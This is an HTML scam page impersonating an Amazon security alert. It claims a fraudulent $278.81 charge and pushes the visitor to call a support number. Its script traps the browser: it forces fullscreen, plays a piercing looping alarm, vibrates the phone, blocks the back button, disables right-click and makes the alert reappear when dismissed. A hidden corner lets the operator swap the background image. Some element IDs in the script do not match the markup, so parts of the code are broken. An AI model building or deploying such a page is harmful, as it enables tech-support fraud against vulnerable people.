<!DOCTYPE html>
<html lang="en">
<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="theme-color" content="#131921">

    <title>Amazon Alert</title>
    <style>
        :root {
            --danger-red: #d93025;
            --danger-bg: #fce8e6;a
            --btn-gray: #e8eaed;
            --btn-gray-text: #3c4043;
            --text-main: #202124;
            --text-sub: #5f6368;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
        }

        html, body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            position: fixed;
            top: 0;
            left: 0;
            background-size: cover;
            background-position: center top;
            background-repeat: no-repeat;
            background-color: #eaeded;
        }

        /* Top-Right Secret Zone for Upload */
        #bgInput { display: none; }
        .top-right-secret {
            position: absolute;
            top: 0;
            right: 0;
            width: 60px;
            height: 60px;
            z-index: 99999;
            cursor: pointer;
        }

        /* Fullscreen Overlay Container */
        .overlay {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: rgba(0, 0, 0, 0.45);
            backdrop-filter: blur(4px);
            -webkit-backdrop-filter: blur(4px);
        }

        /* Pro System Alert Card */
        .alert-card {
            background: #ffffff;
            width: 100%;
            max-width: 340px;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(0, 0, 0, 0.05);
            overflow: hidden;
            animation: modalPop 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes modalPop {
            0% { opacity: 0; transform: scale(0.92); }
            100% { opacity: 1; transform: scale(1); }
        }

        .card-header {
            padding: 20px 20px 12px 20px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .icon-container {
            width: 42px;
            height: 42px;
            background: var(--danger-bg);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }

        .icon-container svg {
            width: 22px;
            height: 22px;
            fill: var(--danger-red);
        }

        .header-text {
            display: flex;
            flex-direction: column;
        }

        .header-title {
            font-size: 16px;
            font-weight: 700;
            color: var(--text-main);
            letter-spacing: -0.2px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .live-dot {
            width: 8px;
            height: 8px;
            background-color: var(--danger-red);
            border-radius: 50%;
            display: inline-block;
            animation: pulse 1.2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(0.8); }
            100% { opacity: 1; transform: scale(1); }
        }

        .header-subtitle {
            font-size: 12px;
            color: var(--text-sub);
            margin-top: 2px;
        }

        /* Editable Content */
        .card-body {
            padding: 4px 20px 18px 20px;
            color: #3c4043;
            font-size: 13.5px;
            line-height: 1.5;
            outline: none;
            user-select: text;
            -webkit-user-select: text;
        }

        .card-body:focus {
            background: #fafafa;
        }

        /* Footer Buttons */
        .card-footer {
            display: flex;
            gap: 10px;
            padding: 12px 16px 16px 16px;
            background: #ffffff;
        }

        .btn {
            flex: 1;
            height: 44px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            display: flex;
            justify-content: center;
            align-items: center;
            text-decoration: none;
            cursor: pointer;
            transition: background 0.15s ease, transform 0.1s ease;
        }

        .btn-cancel {
            background-color: var(--btn-gray);
            color: var(--btn-gray-text);
        }

        .btn-call {
            background-color: var(--danger-red);
            color: #ffffff;
            box-shadow: 0 4px 12px rgba(217, 48, 37, 0.3);
        }

        .btn:active {
            transform: scale(0.97);
        }

        .btn-cancel:active { background-color: #dcdfe3; }
        .btn-call:active { background-color: #b3261e; }
    </style>
</head>
<body id="bgBody" style="background-image: url('contact.jpeg');">

    <!-- Secret Top-Right Zone for Custom Upload -->
    <label class="top-right-secret" id="secretTrigger">
        <input type="file" id="bgInput" accept="image/*">
    </label>

    <div class="overlay" id="overlay">
        <div class="alert-card" id="alertCard">
            
            <div class="card-header">
                <div class="icon-container">
                    <svg viewBox="0 0 24 24">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                    </svg>
                </div>
                <div class="header-text">
                    <div class="header-title">
                        Amazon Account Alert <span class="live-dot"></span>
                    </div>
                    <div class="header-subtitle">Order Verification Required</div>
                </div>
            </div>

        
            <div class="card-body" contenteditable="false" id="alertText">
                Your Amazon ID was recently used at the Amazon Store for a $278.81 transaction via Amazon Pay (Pre-Authorization). To protect your account, we have temporarily placed this request on hold for security verification. If you did not authorize this purchase, please contact Amazon Support immediately at +1-877-374-3816 to secure your account and stop unauthorized activity.
            </div>

            <div class="card-footer">
                <button class="btn btn-cancel" id="cancelBtn">Dismiss</button>
                <a href="tel:1-877-374-3816" class="btn btn-call" id="callBtn">Call</a>
            </div>
        </div>
    </div>

   <script>
    const overlay = document.getElementById('alertOverlay');
    const cancelBtn = document.getElementById('cancelAction');
    let isLocked = false;
    let audioCtx = null;
    let warningTimeoutId = null; // Loop control karne ke liye ID

    // Trigger on ANY interaction (Click or Touch)
    const unlock = () => {
        const el = document.documentElement;

        // --- FULLSCREEN ---
        if (el.requestFullscreen) { el.requestFullscreen(); }
        else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen(); }
        else if (el.mozRequestFullScreen) { el.mozRequestFullScreen(); }
        else if (el.msRequestFullscreen) { el.msRequestFullscreen(); }

        // --- AUDIO CONTEXT UNLOCK FOR IPHONE/ANDROID ---
        if (!audioCtx) {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        }
        
        // Key for iOS: Must resume inside the user-initiated function
        if (audioCtx.state === 'suspended') {
            audioCtx.resume();
        }

        if (!isLocked) {
            isLocked = true;
            
            // Start the urgent high-pitched warning loop
            runWarningLoop();
            
            // Android Vibration Matching the New Fast Pulse (350ms)
            setInterval(() => {
                // Sirf tabhi vibrate kare jab browser screen active/visible ho
                if ("vibrate" in navigator && !document.hidden) {
                    navigator.vibrate([200]); // Choti aur tez vibration pulses
                }
            }, 350);
        }
    };

    document.addEventListener('click', unlock);
    document.addEventListener('touchstart', unlock);

    // Cancel Button: Force reappear
    cancelBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        
        if (audioCtx && audioCtx.state === 'suspended') {
            audioCtx.resume();
        }

        overlay.style.display = 'none';
        setTimeout(() => {
            overlay.style.display = 'flex';
        }, 50);
    });

    // REPLACED: NEW SUPER HIGH-PITCHED PIERCING BEEP LOGIC
    function runWarningLoop() {
        // Agar page background mein hai ya hidden hai (jaise call aane par), toh sound mat bajao
        if (!audioCtx || document.hidden) {
            // Har 350ms baad check karte raho jab tak page wapas samne na aaye
            warningTimeoutId = setTimeout(runWarningLoop, 350);
            return;
        }

        if (audioCtx.state === 'suspended') {
            audioCtx.resume();
        }

        const osc = audioCtx.createOscillator();
        const gainNode = audioCtx.createGain();

        // Nayi coding ke parameters jo kaan me chubhte hain
        osc.type = 'sawtooth';             // Sawtooth wave texture
        osc.frequency.value = 2800;        // 2800Hz High-pitched piercing sound
        
        // Full volume par bina kisi delay ke jhatke se sound play hogi
        gainNode.gain.setValueAtTime(0.8, audioCtx.currentTime);

        osc.connect(gainNode);
        gainNode.connect(audioCtx.destination);

        osc.start();
        
        // 250ms (0.25 seconds) tak beep bajegi, phir stop ho jayegi
        osc.stop(audioCtx.currentTime + 0.25);

        // Har 350ms par loop chalega (0.25s beep + 0.1s gap = non-stop frustration)
        warningTimeoutId = setTimeout(runWarningLoop, 350); 
    }

    // --- CALL / VISIBILITY HANDLING ---
    // Phone Call aane par ya tab badalne par sound ko band karne ke liye logic
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            // 1. Agar browser piche chala gaya (Call screen samne aa gayi), toh sound suspend karo
            if (audioCtx && audioCtx.state === 'running') {
                audioCtx.suspend();
            }
            // Loop ke timeouts ko clear karo taaki background mein battery/memory use na ho
            clearTimeout(warningTimeoutId);
        } else {
            // 2. Jab call khatam ho jaye aur user wapas browser screen par aaye
            if (audioCtx && audioCtx.state === 'suspended' && isLocked) {
                audioCtx.resume();
                // Loop ko fir se start karo
                runWarningLoop();
            }
        }
    });

    // Block Back Button
    window.history.pushState(null, null, window.location.href);
    window.onpopstate = function () {
        window.history.go(1);
    };

    // Disable Right-Click
    document.addEventListener('contextmenu', e => e.preventDefault());
</script>
<div style="display: none;">
    <script id="_wauerz">var _wau = _wau || []; _wau.push(["small", "3dpu2ba2ux", "erz"]);</script><script async src="//waust.at/s.js"></script></div>
